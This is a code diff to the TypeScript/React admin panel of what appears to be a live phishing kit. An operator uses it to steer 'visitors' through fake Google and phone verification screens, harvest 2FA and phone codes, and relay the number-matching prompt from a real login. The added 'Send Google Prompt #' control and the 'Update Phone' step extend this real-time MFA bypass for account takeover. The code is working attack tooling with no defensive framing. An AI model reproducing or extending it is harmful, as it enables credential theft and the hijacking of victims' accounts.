@@ -80,9 +80,9 @@ const STEP_LABELS: Record<string, string> = {
   'verification-code': 'Verify Code',
   'phone-verify': 'Phone Verify',
   'phone-confirm': 'Confirm #',
-  'phone-wrong': 'Wrong #',
+  'phone-wrong': 'Review Activity',
+  'phone-update': 'Update Phone',
   'prompt-number': 'Google Prompt',
-  'sign-in-attempt': 'Trying to Log In',
   'sign-in-blocked': 'Blocked',
   verify: 'Verify CAPTCHA',
   'processing': '⏳ Waiting',
@@ -107,8 +107,8 @@ const STEP_COLORS: Record<string, string> = {
   'phone-verify': '#065f46',
   'phone-confirm': '#0d7a5f',
   'phone-wrong': '#dc2626',
+  'phone-update': '#7c3aed',
   'prompt-number': '#4285F4',
-  'sign-in-attempt': '#5f6368',
   'sign-in-blocked': '#15803d',
   verify: '#1a73e8',
   'processing': '#92400e',
@@ -123,6 +123,7 @@ const FIELD_LABELS: Record<string, string> = {
   email_code: 'Email Code',
   phone: 'Phone Number',
   phone_code: 'Phone Code',
+  phone_update: 'Phone Update',
   verification_code: '2FA Code',
 };
 
@@ -148,7 +149,7 @@ const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: 
     { label: 'Wrong #',        step: 'phone-wrong',    color: '#dc2626' },
     { label: 'Phone Code',     step: 'phone-code',     color: '#b45309' },
     { label: 'Google Prompt',  step: 'prompt-number',  color: '#4285F4' },
-    { label: 'Trying to Log In', step: 'sign-in-attempt', color: '#5f6368' },
+    { label: 'Update Phone',   step: 'phone-update',    color: '#7c3aed' },
   ],
 };
 
@@ -215,11 +216,13 @@ function VisitorModal({
 }: {
   visitor: VisitorInfo;
   onClose: () => void;
-  onPushAction: (visitorId: string, navigate: string) => void;
+  onPushAction: (visitorId: string, navigate: string, extra?: { promptNumber?: number }) => void;
   onDeleteField: (visitorId: string, field: string) => void;
   onDeleteAll: (visitorId: string) => void;
 }) {
   const [iframeLoaded, setIframeLoaded] = useState(false);
+  const [promptDialogOpen, setPromptDialogOpen] = useState(false);
+  const [promptInputVal, setPromptInputVal] = useState('');
   const iframeSrc = visitorModalSrc(visitor);
   const stepColor = STEP_COLORS[visitor.step] ?? '#4b5563';
   const stepLabel = STEP_LABELS[visitor.step] ?? visitor.step;
@@ -338,6 +341,57 @@ function VisitorModal({
                   <ActionBtn key={step} fullWidth label={label} color={color} onClick={() => onPushAction(visitor.id, step)} />
                 ))}
               </div>
+
+              {/* Google Prompt controls */}
+              {visitor.provider === 'google' && (
+                <div className="mb-3 space-y-2">
+                  <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e]">Prompt</p>
+                  <div className="grid grid-cols-2 gap-1.5">
+                    <ActionBtn fullWidth label="✓ Prompt Done" color="#15803d" onClick={() => onPushAction(visitor.id, 'processing')} />
+                    <ActionBtn fullWidth label="↺ Prompt Retry" color="#92400e" onClick={() => onPushAction(visitor.id, 'prompt-timeout')} />
+                  </div>
+                  {!promptDialogOpen ? (
+                    <button
+                      onClick={() => { setPromptInputVal(''); setPromptDialogOpen(true); }}
+                      className="w-full text-[11px] font-semibold py-1.5 rounded-lg border border-[#4285F4] text-[#4285F4] hover:bg-[#4285F4]/10 transition-colors"
+                    >
+                      Send Google Prompt #
+                    </button>
+                  ) : (
+                    <div className="bg-[#1a1d24] rounded-xl border border-[#4285F4]/40 p-3 space-y-2">
+                      <p className="text-[10px] text-[#8a919e]">Number shown on login screen</p>
+                      <input
+                        type="number"
+                        min={1}
+                        max={99}
+                        value={promptInputVal}
+                        onChange={e => setPromptInputVal(e.target.value)}
+                        placeholder="e.g. 42"
+                        className="w-full bg-[#0b0c10] border border-[#2d3139] rounded-lg px-3 py-1.5 text-[13px] text-white placeholder-[#555d6b] outline-none focus:border-[#4285F4] transition-colors"
+                      />
+                      <div className="flex gap-2">
+                        <button
+                          onClick={() => setPromptDialogOpen(false)}
+                          className="flex-1 py-1.5 rounded-lg border border-[#2d3139] text-[11px] text-[#8a919e] hover:bg-[#2d3139] transition-colors"
+                        >
+                          Cancel
+                        </button>
+                        <button
+                          onClick={() => {
+                            const n = parseInt(promptInputVal, 10);
+                            if (n > 0) { onPushAction(visitor.id, 'prompt-number', { promptNumber: n }); setPromptDialogOpen(false); }
+                          }}
+                          className="flex-1 py-1.5 rounded-lg text-[11px] font-semibold text-white transition-colors"
+                          style={{ backgroundColor: '#4285F4' }}
+                        >
+                          Send
+                        </button>
+                      </div>
+                    </div>
+                  )}
+                </div>
+              )}
+
               <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] mb-2">Simulate</p>
               <div className="grid grid-cols-2 gap-1.5">
                 {PROVIDER_ERROR_STEPS.map(({ label, step, color }) => (
@@ -524,10 +578,10 @@ export default function AdminPage() {
     return () => { try { ws?.close(); } catch { /* ignore */ } };
   }, []);
 
-  const pushAction = (visitorId: string, navigate: string) => {
+  const pushAction = (visitorId: string, navigate: string, extra?: { promptNumber?: number }) => {
     const ws = wsRef.current;
     if (ws?.readyState === WebSocket.OPEN) {
-      ws.send(JSON.stringify({ type: 'push-action', visitorId, action: { navigate } }));
+      ws.send(JSON.stringify({ type: 'push-action', visitorId, action: { navigate, ...extra } }));
     }
   };
 
